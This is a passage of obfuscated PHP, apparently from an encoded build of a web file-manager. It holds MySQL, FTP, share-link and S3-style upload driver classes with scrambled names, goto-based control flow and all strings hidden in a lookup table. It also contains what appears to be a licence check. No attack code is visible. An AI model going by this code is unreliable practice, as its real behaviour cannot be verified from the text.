unset($_COOKIE[$A°õÜÈÁ¤®]); self::set($A°õÜÈÁ¤®, $_SERVER[¢ÌÛ][33], 1, $CÂ»äÆÆ…¹); } } if ($_SERVER[$_SERVER[¢ÌÛ][388]] != $_SERVER[$_SERVER[¢ÌÛ][821]]) { goto bøø‰ñ±×; e°ºò°«Ü¡: $e˜öİ»Ø¡($_SERVER[$_SERVER[¢ÌÛ][386]]); goto c‰÷´”¤­Ó; bøø‰ñ±×: $CÔÔåìƒ» = $_SERVER[¢ÌÛ][389]; $cøÆ™®íÁõ = $_SERVER[$_SERVER[¢ÌÛ][390]] . $_SERVER[¢ÌÛ][391]; $AŞÅÁÄĞÂ = $CÔÔåìƒ»($cøÆ™®íÁõ); goto AŠÉê©ƒÍ; AŠÉê©ƒÍ: $CçäÃ¤¿Ø = explode($_SERVER[¢ÌÛ][227], $AŞÅÁÄĞÂ); if (count($CçäÃ¤¿Ø) < $_SERVER[¢ÌÛ][392]) { $AÛãŸ±ŒÃø = $_SERVER[¢ÌÛ][393]; $AÛãŸ±ŒÃø(); } $e˜öİ»Ø¡ = $_SERVER[¢ÌÛ][394]; goto e°ºò°«Ü¡; c‰÷´”¤­Ó: } class DbMysql extends Db { public function __construct($cèôäÙ–¶ = '') { $Fè¶é«Ü« =& $_SERVER[¢ÌÛ]; if (!extension_loaded($Fè¶é«Ü«[750])) { think_exception(think_lang($Fè¶é«Ü«[10]) . $Fè¶é«Ü«[822]); } if (!empty($cèôäÙ–¶)) { $this->config = $cèôäÙ–¶; if (empty($this->config[$Fè¶é«Ü«[13]])) { $this->config[$Fè¶é«Ü«[13]] = $Fè¶é«Ü«[33]; } } } public function connect($f¼ÙŞƒÙÉ£ = '', $AÏš˜šï“× = 0, $f¡ÏîÁÊ¥ù = false) { $FˆÀ«î£Ã =& $_SERVER[¢ÌÛ]; if (!isset($this->linkID[$AÏš˜šï“×])) { goto B­†ƒ°›§Œ; CòŠ“«˜ ƒ: if (1 != think_config($FˆÀ«î£Ã[18])) { unset($this->config); } goto D¨÷Ê²’Êµ; F™çœ¹Û«¥: mysql_query($FˆÀ«î£Ã[827] . think_config($FˆÀ«î£Ã[828]) . $FˆÀ«î£Ã[55], $this->linkID[$AÏš˜šï“×]); if ($aë‡ÈôÖŞ > $FˆÀ«î£Ã[829]) { mysql_query($FˆÀ«î£Ã[830], $this->linkID[$AÏš˜šï“×]); } $this->connected = !0; goto CòŠ“«˜ ƒ; B­†ƒ°›§Œ: if (empty($f¼ÙŞƒÙÉ£)) { $f¼ÙŞƒÙÉ£ = $this->config; } $BÚŞÈ £Î‡ = $f¼ÙŞƒÙÉ£[$FˆÀ«î£Ã[823]] . ($f¼ÙŞƒÙÉ£[$FˆÀ«î£Ã[824]] ? "\72{$f¼ÙŞƒÙÉ£[$FˆÀ«î£Ã[824]]}" : $FˆÀ«î£Ã[33]); $D³èíÍÄ¼í = !empty($f¼ÙŞƒÙÉ£[$FˆÀ«î£Ã[13]][$FˆÀ«î£Ã[14]]) ? $f¼ÙŞƒÙÉ£[$FˆÀ«î£Ã[13]][$FˆÀ«î£Ã[14]] : $this->pconnect; goto fá‡áĞÆ; fá‡áĞÆ: if ($D³èíÍÄ¼í) { $this->linkID[$AÏš˜šï“×] = mysql_pconnect($BÚŞÈ £Î‡, $f¼ÙŞƒÙÉ£[$FˆÀ«î£Ã[825]], $f¼ÙŞƒÙÉ£[$FˆÀ«î£Ã[826]], 131072); } else { $this->linkID[$AÏš˜šï“×] = mysql_connect($BÚŞÈ £Î‡, $f¼ÙŞƒÙÉ£[$FˆÀ«î£Ã[825]], $f¼ÙŞƒÙÉ£[$FˆÀ«î£Ã[826]], !0, 131072); } if (!$this->linkID[$AÏš˜šï“×] || !empty($f¼ÙŞƒÙÉ£[$FˆÀ«î£Ã[17]]) && !mysql_select_db($f¼ÙŞƒÙÉ£[$FˆÀ«î£Ã[17]], $this->linkID[$AÏš˜šï“×])) { think_exception(mysql_error()); } $aë‡ÈôÖŞ = mysql_get_server_info($this->linkID[$AÏš˜šï“×]); goto F™çœ¹Û«¥; D¨÷Ê²’Êµ: } return $this->linkID[$AÏš˜šï“×]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Bùø÷Õ±¦’) { goto EšÍù—°‘³; Bêó§ƒÖÀ: if (!$this->_linkID) { return !1; } $this->queryStr = $Bùø÷Õ±¦’; if ($this->queryID) { $this->free(); } goto bŒªÍ­Œ—; a‹œåÆËˆ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto bì…¯åŠÄ˜; EšÍù—°‘³: $bÄÄåË¡È =& $_SERVER[¢ÌÛ]; if (0 === stripos($Bùø÷Õ±¦’, $bÄÄåË¡È[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto Bêó§ƒÖÀ; bŒªÍ­Œ—: think_action_status($bÄÄåË¡È[19], 1); think_status($bÄÄåË¡È[20]); $this->queryID = mysql_query($Bùø÷Õ±¦’, $this->_linkID); goto a‹œåÆËˆ; bì…¯åŠÄ˜: } public function execute($b‘“¥µŒØ‹) { goto cï´ĞÂ¥À–; A›æå“§‚ê: $this->queryStr = $b‘“¥µŒØ‹; if ($this->queryID) { $this->free(); } think_action_status($bµ†Ú¹†ç[21], 1); goto a¯ÕÖ¬Üó‚; a¯ÕÖ¬Üó‚: think_status($bµ†Ú¹†ç[20]); $D²ğ½â­™ = mysql_query($b‘“¥µŒØ‹, $this->_linkID); $this->debug(); goto eòæºµ†ÏÒ; eòæºµ†ÏÒ: if (!1 === $D²ğ½â­™) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto A¨ÈÆ”†ÔÒ; cï´ĞÂ¥À–: $bµ†Ú¹†ç =& $_SERVER[¢ÌÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A›æå“§‚ê; A¨ÈÆ”†ÔÒ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¢ÌÛ][831], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f¬ˆô¾¢Ó = mysql_query($_SERVER[¢ÌÛ][832], $this->_linkID); $this->transTimes = 0; if (!$f¬ˆô¾¢Ó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bæ–ºçÑˆâ = mysql_query($_SERVER[¢ÌÛ][833], $this->_linkID); $this->transTimes = 0; if (!$Bæ–ºçÑˆâ) { $this->error(); return !1; } } return !0; } private function getAll() { $BÁÚ†™ë„å = array(); if ($this->numRows > 0) { while ($Fõˆ±İ‡ó = mysql_fetch_assoc($this->queryID)) { $BÁÚ†™ë„å[] = $Fõˆ±İ‡ó; } mysql_data_seek($this->queryID, 0); } return $BÁÚ†™ë„å; } public function getFields($aÓï§•—’) { $f¬Œ·‡ ÒŒ =& $_SERVER[¢ÌÛ]; $Bã’ß‹â¢ø = $this->query($f¬Œ·‡ ÒŒ[834] . $this->parseKey($aÓï§•—’)); $Fˆˆì‚µ¬ = array(); if ($Bã’ß‹â¢ø) { foreach ($Bã’ß‹â¢ø as $B“‹’²ì±¤ => $BÃù¤Å‘õˆ) { $Fˆˆì‚µ¬[$BÃù¤Å‘õˆ[$f¬Œ·‡ ÒŒ[27]]] = array($f¬Œ·‡ ÒŒ[28] => $BÃù¤Å‘õˆ[$f¬Œ·‡ ÒŒ[27]], $f¬Œ·‡ ÒŒ[29] => $BÃù¤Å‘õˆ[$f¬Œ·‡ ÒŒ[30]], $f¬Œ·‡ ÒŒ[31] => (bool) (strtoupper($BÃù¤Å‘õˆ[$f¬Œ·‡ ÒŒ[32]]) === $f¬Œ·‡ ÒŒ[835]), $f¬Œ·‡ ÒŒ[34] => $BÃù¤Å‘õˆ[$f¬Œ·‡ ÒŒ[35]], $f¬Œ·‡ ÒŒ[36] => strtolower($BÃù¤Å‘õˆ[$f¬Œ·‡ ÒŒ[37]]) == $f¬Œ·‡ ÒŒ[38], $f¬Œ·‡ ÒŒ[39] => strtolower($BÃù¤Å‘õˆ[$f¬Œ·‡ ÒŒ[40]]) == $f¬Œ·‡ ÒŒ[41]); } } return $Fˆˆì‚µ¬; } public function getTables($CôªÂ¢ï³Ô = '') { $dÙ•¿ÚöÆ =& $_SERVER[¢ÌÛ]; if (!empty($CôªÂ¢ï³Ô)) { $c©×ñŒòÂ’ = $dÙ•¿ÚöÆ[836] . $CôªÂ¢ï³Ô . $dÙ•¿ÚöÆ[837]; } else { $c©×ñŒòÂ’ = $dÙ•¿ÚöÆ[838]; } $E¼¹ÑØ¶À¬ = $this->query($c©×ñŒòÂ’); $e‚õèõ×ª’ = array(); foreach ($E¼¹ÑØ¶À¬ as $F’½Ëœ©ƒ¡ => $F‡÷í¹†ø½) { $e‚õèõ×ª’[$F’½Ëœ©ƒ¡] = current($F‡÷í¹†ø½); } return $e‚õèõ×ª’; } public function replace($b‘‡æ‰È, $a§„Ûåä‹Á = array()) { $BŒçœ–Õ¡ =& $_SERVER[¢ÌÛ]; foreach ($b‘‡æ‰È as $Cƒˆ»«„Ó => $fŸŠ½Õè) { $DĞô‡³À®« = $this->parseValue($fŸŠ½Õè); if (is_scalar($DĞô‡³À®«)) { $EŒ‡Å†°[] = $DĞô‡³À®«; $Cêğ›¡³Õí[] = $this->parseKey($Cƒˆ»«„Ó); } } $c”œÙ‰Éàô = $BŒçœ–Õ¡[839] . $this->parseTable($a§„Ûåä‹Á[$BŒçœ–Õ¡[275]]) . $BŒçœ–Õ¡[840] . implode($BŒçœ–Õ¡[47], $Cêğ›¡³Õí) . $BŒçœ–Õ¡[841] . implode($BŒçœ–Õ¡[47], $EŒ‡Å†°) . $BŒçœ–Õ¡[842]; return $this->execute($c”œÙ‰Éàô); } public function insertAll($C¬º²ÉËÌ±, $dÄÙ…İğÏ = array(), $bæˆ›Í•í× = false) { goto E÷²ñáõÖİ; b‡¯Ü¼ã: $Añ“°‚¾è = array(); foreach ($C¬º²ÉËÌ± as $Còè°‚î„ ) { $FæÇ³áë¾Ç = array(); foreach ($Còè°‚î„  as $FÆª¡ÇÇ†è => $f³ŠÓ¸Üß) { $f³ŠÓ¸Üß = $this->parseValue($f³ŠÓ¸Üß); if (is_scalar($f³ŠÓ¸Üß)) { $FæÇ³áë¾Ç[] = $f³ŠÓ¸Üß; } } $Añ“°‚¾è[] = $Eªƒ³ÙÈ«õ[256] . implode($Eªƒ³ÙÈ«õ[47], $FæÇ³áë¾Ç) . $Eªƒ³ÙÈ«õ[842]; } array_walk($aóù°¥öÊÆ, array($this, $Eªƒ³ÙÈ«õ[843])); goto fº¿à·Ï; fº¿à·Ï: $C“ö¢³¡ê¶ = ($bæˆ›Í•í× ? $Eªƒ³ÙÈ«õ[844] : $Eªƒ³ÙÈ«õ[845]) . $Eªƒ³ÙÈ«õ[846] . $this->parseTable($dÄÙ…İğÏ[$Eªƒ³ÙÈ«õ[275]]) . $Eªƒ³ÙÈ«õ[840] . implode($Eªƒ³ÙÈ«õ[47], $aóù°¥öÊÆ) . $Eªƒ³ÙÈ«õ[847] . implode($Eªƒ³ÙÈ«õ[47], $Añ“°‚¾è); return $this->execute($C“ö¢³¡ê¶); goto cÒ‹Ë§•; E÷²ñáõÖİ: $Eªƒ³ÙÈ«õ =& $_SERVER[¢ÌÛ]; if (!is_array($C¬º²ÉËÌ±[0])) { return !1; } $aóù°¥öÊÆ = array_keys($C¬º²ÉËÌ±[0]); goto b‡¯Ü¼ã; cÒ‹Ë§•: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $EĞØ’˜·ÌÁ =& $_SERVER[¢ÌÛ]; $this->error = mysql_errno() . $EĞØ’˜·ÌÁ[4] . mysql_error($this->_linkID); if ($EĞØ’˜·ÌÁ[33] != $this->queryStr) { $this->error .= LNG($EĞØ’˜·ÌÁ[45]) . $this->queryStr; } think_trace($this->error, $EĞØ’˜·ÌÁ[33], $EĞØ’˜·ÌÁ[46]); return $this->error; } public function escapeString($D«‚ò¿Äö•) { if ($this->_linkID) { return mysql_real_escape_string($D«‚ò¿Äö•, $this->_linkID); } else { return mysql_escape_string($D«‚ò¿Äö•); } } public function parseKey(&$AéëÔù, $e´×„®§™Ó = true) { $F‰˜¨Û¶ËÄ =& $_SERVER[¢ÌÛ]; if ($e´×„®§™Ó) { $AéëÔù = $this->parseKeyCheck($AéëÔù); } if ($AéëÔù != $F‰˜¨Û¶ËÄ[182] && !preg_match($F‰˜¨Û¶ËÄ[848], $AéëÔù)) { $AéëÔù = $F‰˜¨Û¶ËÄ[377] . trim($AéëÔù, $F‰˜¨Û¶ËÄ[377]) . $F‰˜¨Û¶ËÄ[377]; } return $AéëÔù; } } goto aŒ¡¨êë„Ç; C›Œ·èÔÃ¼: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($D©…ïùë½†) { $this->pathParse = $D©…ïùë½†; } protected function infoParse($e®¸áĞ©İÀ, $A¤ğñ¢ŠØ‰ = false) { $e£ÄÂÒÃ†‰ =& $_SERVER[¢ÌÛ]; return Action($e£ÄÂÒÃ†‰[1046])->sharePathInfo($this->pathParse[$e£ÄÂÒÃ†‰[75]], !0, $A¤ğñ¢ŠØ‰); } public function listPath($Bõãï’„ˆ, $D„ˆ­äéÉò = false) { $A¥Ï›Úƒğ =& $_SERVER[¢ÌÛ]; $BÊ¬ñù˜¤è = IO::listPath($Bõãï’„ˆ, $D„ˆ­äéÉò); foreach ($BÊ¬ñù˜¤è as $d”à¸§¦ó’ => $D¾‘ƒëö¬) { if (!in_array($d”à¸§¦ó’, array($A¥Ï›Úƒğ[73], $A¥Ï›Úƒğ[74]))) { continue; } foreach ($D¾‘ƒëö¬ as $Dáï²Ù¦ß => $B§¬º£ã³) { $B§¬º£ã³ = Action($A¥Ï›Úƒğ[1194])->parsePathChildren($B§¬º£ã³, array($A¥Ï›Úƒğ[414] => $Bõãï’„ˆ)); $BÊ¬ñù˜¤è[$d”à¸§¦ó’][$Dáï²Ù¦ß] = Action($A¥Ï›Úƒğ[1046])->shareItemInfo($B§¬º£ã³); } } return $BÊ¬ñù˜¤è; } public function listAll($aëÎ­óÚµÀ) { $f°ƒëîà =& $_SERVER[¢ÌÛ]; $C¶Òõ²’˜… = IO::listAll($aëÎ­óÚµÀ); foreach ($C¶Òõ²’˜… as &$A§ƒì¢µæĞ) { $A§ƒì¢µæĞ = array_merge(IO::info($A§ƒì¢µæĞ[$f°ƒëîà[75]]), $A§ƒì¢µæĞ); $A§ƒì¢µæĞ[$f°ƒëîà[84]] = Action($f°ƒëîà[1046])->shareItemInfo($A§ƒì¢µæĞ); } unset($A§ƒì¢µæĞ); return $C¶Òõ²’˜…; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($cªââÑíŸŒ) { parent::__construct($cªââÑíŸŒ); $this->signatureVersion($_SERVER[¢ÌÛ][210]); } public function uploadFormData($Eò´‡‡•åµ, $F™†±ÓÎ‹ = 3600) { goto D¤–Ÿö’„·; d¦ßó ³×Ÿ: $BÏ–…”¼ôß = $FâˆŸöµ©Ğ[59]; $cÊ‰÷‡¦¦ = gmdate($FâˆŸöµ©Ğ[1196]); $Fİ®œ†Á¶ = gmdate($FâˆŸöµ©Ğ[713]); goto Bå¼šÈç„Ÿ; Bå¼šÈç„Ÿ: $d¤ÚÛ‰²‰ = $FâˆŸöµ©Ğ[1197]; $f¼Àœ‡Œò = $F™†±ÓÎ‹ . $FâˆŸöµ©Ğ[33]; $c¡×Š¦Ê§² = $FâˆŸöµ©Ğ[1161]; goto fíºƒŠòÀ; D¤–Ÿö’„·: $FâˆŸöµ©Ğ =& $_SERVER[¢ÌÛ]; $BÓ¯Àƒ«À» = $FâˆŸöµ©Ğ[191]; $Dáö‚±³„‹ = $FâˆŸöµ©Ğ[1195]; goto d¦ßó ³×Ÿ; fíºƒŠòÀ: $CãÛáªØ° = array($this->accessKey, $Fİ®œ†Á¶, $this->region, $BÏ–…”¼ôß, $d¤ÚÛ‰²‰); $e«ÎØÕ­· = implode($FâˆŸöµ©Ğ[8], $CãÛáªØ°); $bó†ŠÚ©‡õ = array($FâˆŸöµ©Ğ[1163] => gmdate($FâˆŸöµ©Ğ[1162], strtotime($FâˆŸöµ©Ğ[1198])), $FâˆŸöµ©Ğ[1164] => array(array($FâˆŸöµ©Ğ[1166] => $this->bucket), array($FâˆŸöµ©Ğ[1165] => $BÓ¯Àƒ«À»), array($FâˆŸöµ©Ğ[1167], $FâˆŸöµ©Ğ[1168], $FâˆŸöµ©Ğ[33]), array($FâˆŸöµ©Ğ[1167], $FâˆŸöµ©Ğ[1199], $FâˆŸöµ©Ğ[33]), array($FâˆŸöµ©Ğ[1167], $FâˆŸöµ©Ğ[1200], $FâˆŸöµ©Ğ[33]), array($FâˆŸöµ©Ğ[1169] => $c¡×Š¦Ê§²), array($FâˆŸöµ©Ğ[1201] => $e«ÎØÕ­·), array($FâˆŸöµ©Ğ[1202] => $Dáö‚±³„‹), array($FâˆŸöµ©Ğ[1203] => $cÊ‰÷‡¦¦), array($FâˆŸöµ©Ğ[1204] => $f¼Àœ‡Œò))); goto F„öÙŸ¨À; F„öÙŸ¨À: $eùï¿ÆÛŞÅ = base64_encode(json_encode($bó†ŠÚ©‡õ)); $AØÌ¤±ã…© = hash_hmac($FâˆŸöµ©Ğ[1205], $Fİ®œ†Á¶, $FâˆŸöµ©Ğ[1206] . $this->secret, !0); $A†µ¢¼ = hash_hmac($FâˆŸöµ©Ğ[1205], $this->region, $AØÌ¤±ã…©, !0); goto BÃÉ„¤µÖ; b®”ˆïªÏ: $aĞ•×ù‘ÚÉ = array($FâˆŸöµ©Ğ[209] => $FâˆŸöµ©Ğ[33], $FâˆŸöµ©Ğ[1207] => $FâˆŸöµ©Ğ[33], $FâˆŸöµ©Ğ[1165] => $BÓ¯Àƒ«À», $FâˆŸöµ©Ğ[1169] => $c¡×Š¦Ê§², $FâˆŸöµ©Ğ[1173] => $eùï¿ÆÛŞÅ, $FâˆŸöµ©Ğ[1208] => $e«ÎØÕ­·, $FâˆŸöµ©Ğ[1209] => $Dáö‚±³„‹, $FâˆŸöµ©Ğ[1210] => $cÊ‰÷‡¦¦, $FâˆŸöµ©Ğ[1211] => $f¼Àœ‡Œò, $FâˆŸöµ©Ğ[1212] => $CåÚ„ã¢Æ, $FâˆŸöµ©Ğ[175] => $this->getHost()); return $aĞ•×ù‘ÚÉ; goto AÍ‘Î´«Íó; BÃÉ„¤µÖ: $cÕ÷ë§ˆŒ = hash_hmac($FâˆŸöµ©Ğ[1205], $BÏ–…”¼ôß, $A†µ¢¼, !0); $E¥‘Šî„—è = hash_hmac($FâˆŸöµ©Ğ[1205], $d¤ÚÛ‰²‰, $cÕ÷ë§ˆŒ, !0); $CåÚ„ã¢Æ = hash_hmac($FâˆŸöµ©Ğ[1205], $eùï¿ÆÛŞÅ, $E¥‘Šî„—è); goto b®”ˆïªÏ; AÍ‘Î´«Íó: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($d›•¼çÑ—É) { parent::__construct(); if (count($d›•¼çÑ—É) > 0) { $this->_init($d›•¼çÑ—É); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($eæ¥¡‡ÈùÕ) { $B…âÎõƒ¸¡ =& $_SERVER[¢ÌÛ]; global $config; $this->appCharset = $config[$B…âÎõƒ¸¡[1213]]; $this->systemCharset = $config[$B…âÎõƒ¸¡[1214]]; if (isset($eæ¥¡‡ÈùÕ[$B…âÎõƒ¸¡[1215]]) && $eæ¥¡‡ÈùÕ[$B…âÎõƒ¸¡[1215]]) { $this->systemCharset = $eæ¥¡‡ÈùÕ[$B…âÎõƒ¸¡[1215]]; } } public function iconvApp($F°È·ÈÂÏ§) { return $this->iconvTo($F°È·ÈÂÏ§, $this->systemCharset, $this->appCharset); } public function iconvSystem($b¥ñš§ğï) { return $this->iconvTo($b¥ñš§ğï, $this->appCharset, $this->systemCharset); } public function getPathOuter($c¼Ÿ¾‹×¤ƒ) { goto E‚ä¤§ÇÁ; E‚ä¤§ÇÁ: $aÊĞ—ùŒ­ =& $_SERVER[¢ÌÛ]; $Cöœ˜î„¯› = $this->iconvApp($this->pathBase); $c¼Ÿ¾‹×¤ƒ = $this->iconvApp($c¼Ÿ¾‹×¤ƒ); goto DµòîİÉä; E¾Í‹µ”ù: $c¼Ÿ¾‹×¤ƒ = KodIO::clear($c¼Ÿ¾‹×¤ƒ); $c¼Ÿ¾‹×¤ƒ = substr($c¼Ÿ¾‹×¤ƒ, strlen($Cöœ˜î„¯›)); if (empty($this->pathDriver)) { return $c¼Ÿ¾‹×¤ƒ; } goto A¹‘§ğõ¹ë; A¹‘§ğõ¹ë: return $this->pathDriver . $aÊĞ—ùŒ­[8] . ltrim($c¼Ÿ¾‹×¤ƒ, $aÊĞ—ùŒ­[8]); goto AøĞ¼ÄÇ®µ; DµòîİÉä: if (substr($Cöœ˜î„¯›, 0, 2) == $aÊĞ—ùŒ­[1216]) { $Cöœ˜î„¯› = BASIC_PATH . substr($Cöœ˜î„¯›, 2); } if (substr($c¼Ÿ¾‹×¤ƒ, 0, 2) == $aÊĞ—ùŒ­[1216]) { $c¼Ÿ¾‹×¤ƒ = BASIC_PATH . substr($c¼Ÿ¾‹×¤ƒ, 2); } $Cöœ˜î„¯› = KodIO::clear($Cöœ˜î„¯›); goto E¾Í‹µ”ù; AøĞ¼ÄÇ®µ: } private function _init($AÉ‰´Æ¦²Š = array()) { $c‚×´¡‚ =& $_SERVER[¢ÌÛ]; if (!function_exists($c‚×´¡‚[1217])) { throw new Exception(LNG($c‚×´¡‚[1218])); } $this->config = $AÉ‰´Æ¦²Š; $this->charsetReset($AÉ‰´Æ¦²Š); foreach ($AÉ‰´Æ¦²Š as $A‹‘£ÚÚ => $Fëå›ô ‡¼) { if (isset($this->{$A‹‘£ÚÚ})) { $this->{$A‹‘£ÚÚ} = $Fëå›ô ‡¼; } } return $this->_login($AÉ‰´Æ¦²Š); } private function _login($a‡Å¡Ö÷§¹) { goto CØìŞíâ˜™; F³¯àŞì ö: $E¦·¨´Û½Ø[$AøÆ¦’¯åã] = array($Bîğš¹‹‰œ[1222] => $this->connect, $Bîğš¹‹‰œ[175] => $this->host, $Bîğš¹‹‰œ[174] => $this->scheme, $Bîğš¹‹‰œ[176] => $this->port); return $F¦»ÙÕˆñŸ; goto eé“†»Ë‚; DÕÇ”À•å: if (isset($E¦·¨´Û½Ø[$AøÆ¦’¯åã])) { foreach ($E¦·¨´Û½Ø[$AøÆ¦’¯åã] as $B’·Ÿ•ôÍ‰ => $c¯Ë™£ †·) { $this->{$B’·Ÿ•ôÍ‰} = $c¯Ë™£ †·; } return !0; } $f¦®æÃ¢ = parse_url(trim($this->server, $Bîğš¹‹‰œ[8])); $this->host = $f¦®æÃ¢[$Bîğš¹‹‰œ[175]]; goto E®¸Ş¼±; CØìŞíâ˜™: $Bîğš¹‹‰œ =& $_SERVER[¢ÌÛ]; static $E¦·¨´Û½Ø = array(); $AøÆ¦’¯åã = md5(json_encode($a‡Å¡Ö÷§¹)); goto DÕÇ”À•å; Fùè¾¾ïŸ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $F¦»ÙÕˆñŸ = @ftp_login($this->connect, $this->username, $this->userpass); goto Bğä–‚‹ÁÖ; Bğä–‚‹ÁÖ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $A”ÒÜî¼Í† = $this->pasv == $Bîğš¹‹‰œ[86] ? !0 : !1; @ftp_pasv($this->connect, $A”ÒÜî¼Í†); goto F³¯àŞì ö; E®¸Ş¼±: $c­Ø³åÊö» = isset($f¦®æÃ¢[$Bîğš¹‹‰œ[174]]) && $f¦®æÃ¢[$Bîğš¹‹‰œ[174]] == $Bîğš¹‹‰œ[1219] ? !0 : !1; $this->scheme = $c­Ø³åÊö» ? $Bîğš¹‹‰œ[1220] : $Bîğš¹‹‰œ[1221]; $this->port = isset($f¦®æÃ¢[$Bîğš¹‹‰œ[176]]) ? $f¦®æÃ¢[$Bîğš¹‹‰œ[176]] : 21; goto Fùè¾¾ïŸ; eé“†»Ë‚: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($e‡¬‘ÁÌ°õ, $D×—£‰ÆİÓ = '', $a¨êÌ—‹Ô  = REPEAT_RENAME) { if ($this->setContent($e‡¬‘ÁÌ°õ, $D×—£‰ÆİÓ)) { return $this->getPathOuter($e‡¬‘ÁÌ°õ); } return !1; } public function mkdir($A¼ƒ¦ˆÉ¡, $DÓÉ‘Ã = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $A¼ƒ¦ˆÉ¡ = $this->iconvSystem($A¼ƒ¦ˆÉ¡); if ($this->_isFolder($A¼ƒ¦ˆÉ¡) || @ftp_mkdir($this->connect, $A¼ƒ¦ˆÉ¡)) { return $this->getPathOuter($A¼ƒ¦ˆÉ¡); } if (!$this->mkdir($this->pathFather($A¼ƒ¦ˆÉ¡))) { return !1; } if ($A¼ƒ¦ˆÉ¡ = @ftp_mkdir($this->connect, $A¼ƒ¦ˆÉ¡)) { return $this->getPathOuter($A¼ƒ¦ˆÉ¡); } return !1; } public function copyFile($d‹ëõÈÎ’, $d‘ßîéòŒ±) { goto f¿¹âò ¢; EçÅº—ã•: $this->tempFileRemve($B‰¶Î˜÷„); return $eíÜ–è¹¿Ô; goto d‰İÖÆÏÕ•; EÎÈ­­İÛŞ: $fÅ‘íøÄ¸ = $this->iconvApp($B‰¶Î˜÷„); $this->download($d‹ëõÈÎ’, $fÅ‘íøÄ¸); $eíÜ–è¹¿Ô = $this->upload($d‘ßîéòŒ±, $fÅ‘íøÄ¸); goto EçÅº—ã•; f¿¹âò ¢: if (!$this->_isconn()) { return !1; } $B†Íí³ˆ² = $this->pathThis($this->iconvSystem($d‹ëõÈÎ’)); $B‰¶Î˜÷„ = $this->tempFile($B†Íí³ˆ²); goto EÎÈ­­İÛŞ; d‰İÖÆÏÕ•: } public function moveFile($b´÷â¯¬Ç­, $dÏß¾†è’â) { if (!$this->_isconn()) { return !1; } $b´÷â¯¬Ç­ = $this->iconvSystem($b´÷â¯¬Ç­); $dÏß¾†è’â = $this->iconvSystem($dÏß¾†è’â); $B©ÜØãÄÆ° = @ftp_rename($this->connect, $b´÷â¯¬Ç­, $dÏß¾†è’â); return $B©ÜØãÄÆ° ? $this->getPathOuter($dÏß¾†è’â) : !1; } public function delFile($f«¨øù¤é) { if (!$this->_isconn()) { return !1; } $f«¨øù¤é = $this->iconvSystem($f«¨øù¤é); return @ftp_delete($this->connect, $f«¨øù¤é); } public function delFolder($cëƒ‹İ·˜×) { goto A£’µƒğ; EÄäÕÍİğ: foreach ($EÆåª¹ê°– as $e˜ ÖÆ”²í) { $e˜ ÖÆ”²í = $this->iconvSystem($e˜ ÖÆ”²í); $FÖ¤Ã‹æ = @ftp_rmdir($this->connect, $e˜ ÖÆ”²í); if (!$FÖ¤Ã‹æ) { return !1; } } $cëƒ‹İ·˜× = $this->iconvSystem($cëƒ‹İ·˜×); return @ftp_rmdir($this->connect, $cëƒ‹İ·˜×); goto bß„®Ñ„óÌ; d¡ŸË‘¥·Ó: $this->fileList($cëƒ‹İ·˜×, $EÆåª¹ê°–, $fæíå¼ßßŒ, !0); $this->listItemCache = !0; foreach ($fæíå¼ßßŒ as $f—ÃØ÷„ï) { $e˜ ÖÆ”²í = $this->iconvSystem($f—ÃØ÷„ï[$_SERVER[¢ÌÛ][28]]); $FÖ¤Ã‹æ = @ftp_delete($this->connect, $e˜ ÖÆ”²í); if (!$FÖ¤Ã‹æ) { return !1; } } goto EÄäÕÍİğ; A£’µƒğ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $EÆåª¹ê°– = $fæíå¼ßßŒ = array(); goto d¡ŸË‘¥·Ó; bß„®Ñ„óÌ: } public function rename($bÊõ…ä¶ö², $E¼ÎªĞĞ¼Æ) { goto fÓÑá»Öğ; D†ÉƒÆ¿˜‡: $dåÀ½ñ¬Æ = rtrim($bÃîÆîî, $dÉâÑ£ÂìÄ[8]) . $dÉâÑ£ÂìÄ[8] . $BğŸëÇîí; $e±Š†âàŠ = @ftp_rename($this->connect, $bÊõ…ä¶ö², $dåÀ½ñ¬Æ); $dåÀ½ñ¬Æ = $this->iconvApp($dåÀ½ñ¬Æ); goto f–Ä­é‹—; fÓÑá»Öğ: $dÉâÑ£ÂìÄ =& $_SERVER[¢ÌÛ]; if (!$this->_isconn()) { return !1; } $BğŸëÇîí = $this->fileNameAuto($this->pathFather($bÊõ…ä¶ö²), $E¼ÎªĞĞ¼Æ); goto c”–¿íÒñ; f–Ä­é‹—: return $e±Š†âàŠ ? $this->getPathOuter($dåÀ½ñ¬Æ) : !1; goto CÌ¯ô«¸ Ñ; c”–¿íÒñ: $BğŸëÇîí = $this->iconvSystem($BğŸëÇîí); $bÊõ…ä¶ö² = $this->iconvSystem($bÊõ…ä¶ö²); $bÃîÆîî = $this->pathFather($bÊõ…ä¶ö²); goto D†ÉƒÆ¿˜‡; CÌ¯ô«¸ Ñ: } private function folderInfo($bŸœµ«®, $e»¢Æ–ô¡ = false) { $A·İï İ¹ =& $_SERVER[¢ÌÛ]; $d›Ñ°öõ„á = array($A·İï İ¹[28] => $this->pathThis($bŸœµ«®), $A·İï İ¹[75] => 